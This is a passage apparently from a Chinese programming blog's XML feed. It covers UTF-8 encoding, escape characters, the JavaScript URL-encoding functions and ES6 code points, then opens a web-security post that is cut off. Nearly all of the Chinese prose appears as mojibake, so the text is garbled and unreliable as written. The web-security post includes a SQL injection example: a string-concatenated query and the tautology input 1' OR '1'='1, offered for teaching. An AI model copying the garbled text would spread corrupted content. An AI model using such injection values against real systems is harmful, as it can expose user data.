æ–¹å¼ã€‚<code>UTF-8</code>å°±æ˜¯äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿çš„ä¸€ç§Unicodeçš„å®ç°æ–¹å¼ã€‚UTF-8æœ€å¤§çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯å®ƒæ˜¯ä¸€ç§<em>å˜é•¿çš„ç¼–ç æ–¹å¼</em>ã€‚å®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ã€‚UTF-8çš„ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼Œåªæœ‰ä¸¤æ¡ï¼š</p><ul><li><p>å¯¹äºå•å­—èŠ‚çš„ç¬¦å·ï¼Œå­—èŠ‚çš„ç¬¬ä¸€ä½è®¾ä¸º0ï¼Œåé¢7ä½ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚å› æ­¤å¯¹äºè‹±æ–‡å­—æ¯ï¼ŒUTF-8ç¼–ç å’ŒASCIIç æ˜¯ç›¸åŒçš„ã€‚</p></li><li><p>å¯¹äºnå­—èŠ‚çš„ç¬¦å·(n &gt; 1)ï¼Œ ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰nä½éƒ½è®¾ä¸º1ï¼Œ ç¬¬n+1ä½è®¾ä¸º0ï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½ä¸€å¾‹è®¾ä¸º10.å‰©ä¸‹çš„æ²¡æœ‰æåŠçš„äºŒè¿›åˆ¶ä½ï¼Œå…¨éƒ¨ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Unicodeç¬¦å·èŒƒå›´       | UTF-8ç¼–ç æ–¹å¼</span><br><span class="line">(åå…­è¿›åˆ¶)            | äºŒè¿›åˆ¶</span><br><span class="line">0000 0000-0000 007F | 0xxxxxxx</span><br><span class="line">0000 0080-0000 07FF | 110xxxxx 10xxxxxx</span><br><span class="line">0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line">0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-5-Charset-and-Encoding"><a href="#1-5-Charset-and-Encoding" class="headerlink" title="1.5. Charset and Encoding"></a>1.5. Charset and Encoding</h4><p>æ‰€ä»¥, å­—ç¬¦é›†å’Œå­—ç¬¦ç¼–ç ï¼Œä½ å¯ä»¥è¿™æ ·ç†è§£</p><ul><li><p><em><code>Charset(Character set) å­—ç¬¦é›†</code></em><br>æ˜¯å¯¹å­—ç¬¦æŠ½è±¡è¡¨ç¤ºçš„é›†åˆã€‚åŒ…æ‹¬ä¸–ç•Œä¸Šå„ç§æ–‡å­—ã€ç¬¦å·ã€‚</p></li><li><p><em><code>Encoding(Character Encoding) å­—ç¬¦ç¼–ç </code></em><br>å»ºç«‹å­—ç¬¦é›†åˆå’Œè®¡ç®—æœºç³»ç»Ÿå¯¹åº”çš„è§„åˆ™ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼Œå°†å­—ç¬¦è½¬åŒ–ä¸ºè®¡ç®—æœºå¯è¯†åˆ«çš„äºŒè¿›åˆ¶ç¼–ç çš„è§„åˆ™ã€‚</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt;</span><br></pre></td></tr></table></figure><p><br> </p><h3 id="2-ä¹±ç "><a href="#2-ä¹±ç " class="headerlink" title="2. ä¹±ç "></a>2. ä¹±ç </h3><p>ç¼–ç Aå’Œç¼–ç Bé‡‡ç”¨ä¸åŒæ–¹å¼æ¥ç¼–ç ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨ç¼–ç Aåœ¨åªæœ‰ç¼–ç Bçš„è®¾å¤‡ä¸Šè§£ç ï¼Œå°±ä¼šå‡ºç°ä¹±ç ã€‚</p><p><br></p><h3 id="3-è½¬ä¹‰å­—ç¬¦"><a href="#3-è½¬ä¹‰å­—ç¬¦" class="headerlink" title="3. è½¬ä¹‰å­—ç¬¦"></a>3. è½¬ä¹‰å­—ç¬¦</h3><p>æ‰€æœ‰ç¼–ç¨‹è¯­è¨€ï¼Œéƒ½æ‹¥æœ‰è½¬ä¹‰å­—ç¬¦ã€‚</p><p><em>å‡ºç°è½¬ä¹‰å­—ç¬¦çš„åŸå› </em></p><ul><li>ä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ¥è¡¨ç¤ºæ²¡æœ‰ç°æˆæ–‡å­—ä»£å·çš„å­—ç¬¦ï¼Œå¦‚å›è½¦ï¼Œæ¢è¡Œï¼ŒASCIIé‡Œçš„æ§åˆ¶å­—ç¬¦ã€‚</li><li>ä¸€äº›ç‰¹å®šçš„å­—ç¬¦åœ¨è¯­è¨€ä¸­è¢«å®šä¹‰ä¸ºç‰¹æ®Šç”¨é€”ï¼Œå¤±å»äº†åŸæ¥çš„æ„ä¹‰ã€‚</li></ul><p><em>è½¬ä¹‰å­—ç¬¦çš„ä½œç”¨</em></p><ul><li>ç”¨äºè¡¨ç¤ºä¸èƒ½ç›´æ¥æ˜¾ç¤ºçš„å­—ç¬¦</li><li>å°†æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦è½¬æ¢å›å®ƒåŸæ¥çš„æ„ä¹‰</li><li>å¤„äºç½‘ç«™å®‰å…¨ï¼Œåœ¨æ•°æ®å†™å…¥æ•°æ®åº“å‰ï¼Œéƒ½ä¼šä½¿ç”¨è½¬ä¹‰å­—ç¬¦å¯¹ä¸€äº›æ•æ„Ÿå­—ç¬¦è½¬ä¹‰</li></ul><p><br></p><h4 id="3-1-C"><a href="#3-1-C" class="headerlink" title="3.1 C"></a>3.1 C</h4><p>æ‰€æœ‰ASCIIç éƒ½å¯ä»¥ç”¨<code>\</code>åŠ 8è¿›åˆ¶æ•°å­—æ¥è¡¨ç¤ºã€‚Cä¸­å®šä¹‰äº†ä¸€äº›å­—æ¯å‰åŠ <code>\</code>æ¥è¡¨ç¤ºå¸¸è§çš„ï¼Œä¸èƒ½æ˜¾ç¤ºçš„ASCIIå­—ç¬¦ï¼Œæˆä¸ºè½¬ä¹‰å­—ç¬¦ã€‚</p><table><thead><tr><th>è½¬ä¹‰å­—ç¬¦</th><th style="text-align:center">æ„ä¹‰</th><th style="text-align:right">ASCIIç å€¼(åè¿›åˆ¶)</th></tr></thead><tbody><tr><td>\a</td><td style="text-align:center">å“é“ƒ</td><td style="text-align:right">007</td></tr><tr><td>\b</td><td style="text-align:center">é€€æ ¼</td><td style="text-align:right">008</td></tr><tr><td>\f</td><td style="text-align:center">æ¢é¡µ</td><td style="text-align:right">012</td></tr><tr><td>\n</td><td style="text-align:center">æ¢è¡Œ</td><td style="text-align:right">010</td></tr><tr><td>\r</td><td style="text-align:center">å›è½¦</td><td style="text-align:right">013</td></tr><tr><td>\t</td><td style="text-align:center">æ°´å¹³åˆ¶è¡¨ï¼ˆè·³åˆ°ä¸‹ä¸€ä¸ªtabï¼‰ä½ç½®</td><td style="text-align:right">009</td></tr><tr><td>\v</td><td style="text-align:center">å‚ç›´åˆ¶è¡¨</td><td style="text-align:right">011</td></tr><tr><td><code>\\</code></td><td style="text-align:center">ä»£è¡¨ä¸€ä¸ªåæ–œçº¿å­—ç¬¦<code>\</code></td><td style="text-align:right">092</td></tr><tr><td>\â€™</td><td style="text-align:center">ä»£è¡¨ä¸€ä¸ªå•å¼•å·</td><td style="text-align:right">039</td></tr><tr><td>\â€</td><td style="text-align:center">ä»£è¡¨ä¸€ä¸ªåŒå¼•å·å­—ç¬¦</td><td style="text-align:right">034</td></tr><tr><td>\?</td><td style="text-align:center">ä»£è¡¨ä¸€ä¸ªé—®å·</td><td style="text-align:right">063</td></tr><tr><td>\0</td><td style="text-align:center">ç©ºå­—ç¬¦()</td><td style="text-align:right">000</td></tr><tr><td>\ddd</td><td style="text-align:center">1åˆ°3ä½å…«è¿›åˆ¶æ•°æ‰€ä»£è¡¨çš„ä»»æ„å­—ç¬¦</td><td style="text-align:right">ä¸‰ä½å…«è¿›åˆ¶</td></tr><tr><td>\xhh</td><td style="text-align:center">1åˆ°2ä½åå…­è¿›åˆ¶æ‰€ä»£è¡¨çš„ä»»æ„å­—ç¬¦</td><td style="text-align:right">äºŒä½åå…­è¿›åˆ¶</td></tr></tbody></table><p><br></p><h4 id="3-1-html"><a href="#3-1-html" class="headerlink" title="3.1 html"></a>3.1 html</h4><p>HTMLä¸­<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>ç­‰æœ‰ç‰¹æ®Šå«ä¹‰(&lt;&gt;ç”¨äºæ ‡ç­¾ç¬¦ï¼Œ&amp;ç”¨äºè½¬ä¹‰)ï¼Œå¸¸ç”¨</p><table><thead><tr><th>æ˜¾ç¤º</th><th style="text-align:center">è¯´æ˜</th><th style="text-align:center">å®ä½“åç§°</th></tr></thead><tbody><tr><td>&lt;</td><td style="text-align:center">å°äº</td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td><code>&gt;</code></td><td style="text-align:center">å¤§äº</td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td>&amp;</td><td style="text-align:center">&amp;ç¬¦å·</td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td>â€œ</td><td style="text-align:center">åŒå¼•å·</td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td></td><td style="text-align:center">ä¸æ–­è¡Œçš„ç©ºç™½æ ¼</td><td style="text-align:center"><code>&amp;nbsp;</code></td></tr></tbody></table><p><br></p><h4 id="3-2-js"><a href="#3-2-js" class="headerlink" title="3.2 js"></a>3.2 js</h4><p><code>\</code>åæ–œæ ç”¨æ¥åœ¨æ–‡æœ¬å­—ç¬¦ä¸²ä¸­æ’å…¥ç‰¹æ®Šå­—ç¬¦ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var txt = &quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>ä»£ç </th><th style="text-align:center">è¾“å‡º</th></tr></thead><tbody><tr><td>\â€™</td><td style="text-align:center">å•å¼•å·</td></tr><tr><td>\â€</td><td style="text-align:center">åŒå¼•å·</td></tr><tr><td>\&amp;</td><td style="text-align:center">å’Œå·</td></tr><tr><td><code>\\</code></td><td style="text-align:center">åæ–œæ </td></tr><tr><td>\n</td><td style="text-align:center">æ¢è¡Œç¬¦</td></tr><tr><td>\r</td><td style="text-align:center">å›è½¦ç¬¦</td></tr></tbody></table><p><br></p><h3 id="4-URLç¼–ç å‡½æ•°"><a href="#4-URLç¼–ç å‡½æ•°" class="headerlink" title="4. URLç¼–ç å‡½æ•°"></a>4. URLç¼–ç å‡½æ•°</h3><p>ä¸–ç•Œä¸Šæœ‰è‹±æ–‡å­—æ¯çš„ç½‘å€<code>â€œhttp://www.baidu.comâ€</code>,ä½†æ˜¯æ²¡æœ‰å¸Œè…Šå­—æ¯çš„ç½‘å€<code>â€œhttp://www.aÎ²Î³.comâ€</code>ã€‚è¿™æ˜¯å› ä¸ºç½‘ç»œæ ‡å‡†RFC 1738åšäº†ç¡¬æ€§è§„å®šï¼š</p><blockquote><p>â€œâ€¦Only alphanumerics [0-9a-zA-Z], the special characters â€œ$-_.+!*â€™(),â€ [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.â€</p></blockquote><p>åªæœ‰å­—æ¯å’Œæ•°å­—[0-9a-zA-Z],ä¸€äº›ç‰¹æ®Šç¬¦å·<code>$-_.+!*&#39;(),</code>(ä¸åŒ…æ‹¬åŒå¼•å·),ä»¥åŠæŸäº›ä¿ç•™å­—ï¼Œæ‰å¯ä»¥ä¸ç»è¿‡ç¼–ç ç›´æ¥ç”¨äºURLã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœURLä¸­æœ‰æ±‰å­—ï¼Œå°±å¿…é¡»ç¼–ç åä½¿ç”¨ã€‚ä½†éº»çƒ¦çš„æ˜¯ï¼ŒRFC1738æ²¡æœ‰è§„å®šå…·ä½“çš„ç¼–ç æ–¹æ³•ï¼Œäºæ˜¯æœ‰äº†ç¼–ç å‡½æ•°ã€‚</p><p><br></p><h4 id="4-1-æµè§ˆå™¨ç¼–ç "><a href="#4-1-æµè§ˆå™¨ç¼–ç " class="headerlink" title="4.1 æµè§ˆå™¨ç¼–ç "></a>4.1 æµè§ˆå™¨ç¼–ç </h4><p>å½“ç½‘å€è·¯å¾„ä¸­åŒ…å«æ±‰å­—ï¼Œ<code>GET</code>å’Œ<code>POST</code>æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­åŒ…å«æ±‰å­—æ—¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.haoroom.con/search?keywords=æ‚¨å¥½</span><br></pre></td></tr></table></figure></p><p>ç¼–ç æ–¹æ³•ç”±ç½‘é¡µçš„ç¼–ç å†³å®š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=xxxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-escape"><a href="#4-2-escape" class="headerlink" title="4.2 escape"></a>4.2 escape</h4><p><code>escape()</code>å·²è¢«å¼ƒç”¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¿”å›å­—ç¬¦çš„Unicodeç¼–ç å€¼ã€‚å¯¹åº”çš„è§£ç å‡½æ•°æ˜¯<code>unescape</code>ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;æ˜¥èŠ‚&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:escape(&quot;hello word&quot;);</span><br><span class="line">// &quot;hello%20word&quot;</span><br></pre></td></tr></table></figure></p><p>æ— è®ºç½‘é¡µçš„åŸå§‹ç¼–ç æ˜¯ä»€ä¹ˆï¼Œä¸€æ—¦è¢«javascriptç¼–ç ï¼Œéƒ½ä¼šå˜æˆUnicodeå­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯ï¼ŒJavascriptçš„è¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯unicodeå­—ç¬¦ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;%u6625%u8282&quot;);</span><br><span class="line">// &quot;æ˜¥èŠ‚&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;æ˜¥èŠ‚&quot;</span><br></pre></td></tr></table></figure></p><p>å…¶æ¬¡ï¼Œ<code>escape()</code>ä¸å¯¹<code>+</code>ç¼–ç ã€‚ä½†æ˜¯ï¼Œç½‘é¡µåœ¨æäº¤è¡¨å•çš„æ—¶å€™ï¼Œå¦‚æœæœ‰ç©ºæ ¼ï¼Œåˆ™ä¼šè¢«è½¬åŒ–ä¸º<code>+</code>å­—ç¬¦ã€‚æœåŠ¡å™¨å¤„ç†æ•°æ®çš„æ—¶å€™ï¼Œä¼šæŠŠ<code>+</code>å·å¤„ç†æˆç©ºæ ¼ã€‚æ‰€ä»¥ï¼Œä½¿ç”¨çš„æ—¶å€™è¦å°å¿ƒã€‚</p><p><br></p><h4 id="4-3-encodeURI"><a href="#4-3-encodeURI" class="headerlink" title="4.3 encodeURI"></a>4.3 encodeURI</h4><p>å¯¹æ•´ä¸ªURIè¿›è¡Œç¼–ç ã€‚é™¤äº†å¸¸è§çš„ç¬¦å·å¤–ï¼Œ å¯¹ç‰¹æ®Šç¬¦å·<code>&#39;;/?:@&amp;=+$,#</code>ä¸è¿›è¡Œç¼–ç ã€‚ç¼–ç åï¼Œè¾“å‡ºç¬¦å·æ˜¯<code>UTF-8</code>å½¢å¼ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªå­—èŠ‚ä¸Šå‰åŠ ä¸Š<code>%</code>ã€‚å¯¹åº”çš„è§£ç å‡½æ•°æ˜¯<code>decodeURI</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURI(&apos;https://www.baidu.com/s?wd=ä¸­æ–‡&apos;)</span><br><span class="line">// &quot;https://www.baidu.com/s?wd=%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒä¸å¯¹å•å¼•å·<code>&#39;</code>ç¼–ç ã€‚<br><br></p><h4 id="4-4-encodeURIComponent"><a href="#4-4-encodeURIComponent" class="headerlink" title="4.4 encodeURIComponent"></a>4.4 encodeURIComponent</h4><p>å¯¹äº<code>&#39;;/?:@&amp;=+$,#</code>ï¼Œè¿™äº›åœ¨<code>encodeURI</code>ä¸­ä¸è¢«ç¼–ç çš„ç¬¦å·ï¼Œåœ¨<code>encodeURIComponent</code>ä¸­ç»Ÿç»Ÿä¼šè¢«ç¼–ç ã€‚å¯¹åº”çš„è§£ç å‡½æ•°æ˜¯<code>decodeURIComponent</code>ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&quot;https://www.baidu.com/s?wd=ä¸­æ–‡&quot;)</span><br><span class="line">// &quot;https%3A%2F%2Fwww.baidu.com%2Fs%3Fwd%3D%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-ES6å­—ç¬¦ä¸²"><a href="#5-ES6å­—ç¬¦ä¸²" class="headerlink" title="5. ES6å­—ç¬¦ä¸²"></a>5. ES6å­—ç¬¦ä¸²</h3><p>ES6åŠ å¼ºäº†å¯¹Unicodeçš„æ”¯æŒï¼Œå¹¶ä¸”æ‰©å±•äº†å­—ç¬¦ä¸²å¯¹è±¡ã€‚</p><h4 id="5-1-UTF-16ç ä½"><a href="#5-1-UTF-16ç ä½" class="headerlink" title="5.1 UTF-16ç ä½"></a>5.1 UTF-16ç ä½</h4><p>åœ¨ES6å‡ºç°å‰ï¼ŒJavascriptå­—ç¬¦ä¸²ä¸€ç›´åŸºäº16ä½å­—ç¬¦ç¼–ç (UTF-16)è¿›è¡Œæ„å»ºã€‚è¿‡å»16ä½è¶³ä»¥åŒ…å«ä»»ä½•å­—ç¬¦ï¼Œç›´åˆ°Unicodeå¼•å…¥æ‰©å±•å­—ç¬¦é›†ï¼Œç¼–ç è§„åˆ™æ‰ä¸å¾—ä¸è¿›è¡Œæ›´æ”¹ã€‚ä¸ºæ­¤ï¼Œ<code>UTF-16</code>å¼•å…¥äº†ä»£ç†å¯¹ï¼Œè§„å®šäº†ç”¨ä¸¤ä¸ª16ä½ç¼–ç å•å…ƒè¡¨ç¤ºä¸€ä¸ªç ä½ã€‚<br>å› æ­¤ï¼Œå­—ç¬¦ä¸²é‡Œçš„å­—ç¬¦æœ‰ä¸¤ç§:</p><ul><li>ä¸€ç§æ˜¯ç”±ä¸€ä¸ªç¼–ç å•å…ƒ16ä½è¡¨ç¤ºçš„BMPå­—ç¬¦</li><li>å¦ä¸€ç§æ˜¯ç”±ä¸¤ä¸ªç¼–ç å•å…ƒ32ä½è¡¨ç¤ºçš„è¾…åŠ©å¹³é¢å­—ç¬¦ã€‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\uD842\uDFB7&quot;</span><br><span class="line">// &quot;ğ ®·&quot;</span><br><span class="line"></span><br><span class="line">&quot;\u0061&quot;</span><br><span class="line">// &quot;a&quot;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-2-codePointAt"><a href="#5-2-codePointAt" class="headerlink" title="5.2 codePointAt"></a>5.2 codePointAt</h4><p><code>codePointAt</code>æ–¹æ³•æ¥å—ç¼–ç å•å…ƒçš„ä½ç½®è€Œéå­—ç¬¦ä½ç½®ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸å­—ç¬¦ä¸²ä¸­ç»™å®šä½ç½®å¯¹åº”çš„ç ä½ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let text = &quot;ğ ®·a&quot;;</span><br><span class="line">console.log(text.charCodeAt(0)) // 55362</span><br><span class="line">console.log(text.charCodeAt(1)) // 57271</span><br><span class="line">console.log(text.charCodeAt(2)) // 97</span><br><span class="line"></span><br><span class="line">// codePointAtèƒ½å¤Ÿæ­£ç¡®å¤„ç†4ä¸ªå­—èŠ‚å‚¨å­˜çš„å­—ç¬¦ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦çš„ç ç‚¹ã€‚</span><br><span class="line">console.log(text.codePointAt(0)) // 134071</span><br><span class="line">console.log(text.codePointAt(1)) // 57271</span><br><span class="line">console.log(text.codePointAt(2)) // 97</span><br></pre></td></tr></table></figure></p><p>æ£€æµ‹ä¸€ä¸ªå­—ç¬¦å ç”¨çš„ç¼–ç å•å…ƒæ•°é‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function is32Bit(c)&#123;</span><br><span class="line">return c.codePointAt(0) &gt; 0xFFFF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-fromCodePoint"><a href="#5-3-fromCodePoint" class="headerlink" title="5.3 fromCodePoint"></a>5.3 fromCodePoint</h4><p>æ ¹æ®æŒ‡å®šçš„ç ä½ç”Ÿæˆä¸€ä¸ªå­—ç¬¦ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCodePoint(134071) // &quot;ğ ®·&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-normalize"><a href="#5-4-normalize" class="headerlink" title="5.4 normalize"></a>5.4 normalize</h4><p>å¦‚æœæˆ‘ä»¬è¦å¯¹ä¸åŒå­—ç¬¦è¿›è¡Œæ’åºæˆ–å¯¹æ¯”ï¼Œä¸€å®šå…ˆæŠŠå®ƒä»¬æ ‡å‡†åŒ–ä¸ºåŒä¸€ç§å½¢å¼ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text.normalize()</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="http://chunge2016.online/2017/05/19/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8-Charset-and-Encoding/" target="_blank" rel="noopener">ASCIIï¼ŒUnicodeå’ŒUTF-8 (Charset and Encoding)</a></li><li><a href="https://www.cnblogs.com/liupp123/articles/8023861.html" target="_blank" rel="noopener">å­—ç¬¦ç¼–ç ä¸­ASCIIã€Unicodeå’ŒUTF-8çš„åŒºåˆ«</a></li><li><a href="https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397?fr=aladdin" target="_blank" rel="noopener">è½¬ä¹‰å­—ç¬¦</a></li><li><a href="https://www.haorooms.com/post/js_escape_encodeURIComponent" target="_blank" rel="noopener">urlçš„ä¸‰ä¸ªjsç¼–ç å‡½æ•°escape(),encodeURI(),encodeURIComponent()ç®€ä»‹</a></li><li><a href="http://es6.ruanyifeng.com/?search=char&amp;x=0&amp;y=0#docs/string#%E5%AD%97%E7%AC%A6%E7%9A%84-Unicode-%E8%A1%A8%E7%A4%BA%E6%B3%95" target="_blank" rel="noopener">å­—ç¬¦ä¸²çš„æ‰©å±•</a></li><li>ã€Šæ·±å…¥ç†è§£ES6ã€‹ç¬¬äºŒç«  å­—ç¬¦ä¸²å’Œæ­£åˆ™è¡¨è¾¾å¼</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webå®‰å…¨</title>
      <link href="/2019/02/16/Web%E5%AE%89%E5%85%A8/"/>
      <url>/2019/02/16/Web%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>æµè§ˆå™¨å®‰å…¨å¯ä»¥åˆ†ä¸ºä¸‰å¤§å—â€”â€”Web é¡µé¢å®‰å…¨ã€æµè§ˆå™¨ç½‘ç»œå®‰å…¨å’Œæµè§ˆå™¨ç³»ç»Ÿå®‰å…¨ã€‚</p></blockquote><h3 id="1-sqlæ³¨å…¥"><a href="#1-sqlæ³¨å…¥" class="headerlink" title="1. sqlæ³¨å…¥"></a>1. sqlæ³¨å…¥</h3><p>é€šè¿‡æŠŠsqlå‘½ä»¤æ’å…¥åˆ°webè¡¨å•æäº¤ï¼Œæˆ–è¾“å…¥åŸŸå/é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„sqlå‘½ä»¤ã€‚</p><p>å˜é‡idæ˜¯ä¸€ä¸ªä»ç”¨æˆ·ç•Œé¢ä¼ æ¥çš„å€¼<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string sql = " <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'" + id + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p><p>IDå€¼: <em><code>1&#39; OR &#39;1&#39; = &#39;1</code></em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure></p><p>ä»usersè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½æŸ¥è¯¢å‡ºæ¥ï¼Œä»…ä»…é€šè¿‡ä¸€ä¸ªç®€å•çš„æ’çœŸè¡¨è¾¾å¼ã€‚<br><br></p><h3 id="2-XSSè„šæœ¬æ”»å‡»"><a href="#2-XSSè„šæœ¬æ”»å‡»" class="headerlink" title="2. XSSè„šæœ¬æ”»å‡»"></a>2. XSSè„šæœ¬æ”»å‡»</h3><p>é»‘å®¢é€šè¿‡â€HTMLæ³¨å…¥â€ç¯¡æ”¹ç½‘é¡µï¼Œæ’å…¥äº†æ¶æ„çš„è„šæœ¬ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨çš„ä¸€ç§æ”»å‡»ã€‚</p><h4 id="2-1-å¦‚ä½•æ³¨å…¥æ¶æ„è„šæœ¬"><a href="#2-1-å¦‚ä½•æ³¨å…¥æ¶æ„è„šæœ¬" class="headerlink" title="2.1 å¦‚ä½•æ³¨å…¥æ¶æ„è„šæœ¬"></a>2.1 å¦‚ä½•æ³¨å…¥æ¶æ„è„šæœ¬</h4><p>ä¸€æ—¦ä½ æµè§ˆå·²ç»è¢«é»‘å®¢ç•™ä¸‹XSS scriptçš„é¡µé¢ï¼Œè¿™æ®µjså°±ä¼šæ‰§è¡Œï¼Œcookieä¿¡æ¯å°±ä¼šè¢«å·èµ°ã€‚é»‘å®¢å¯ä»¥å‡å†’ä½ 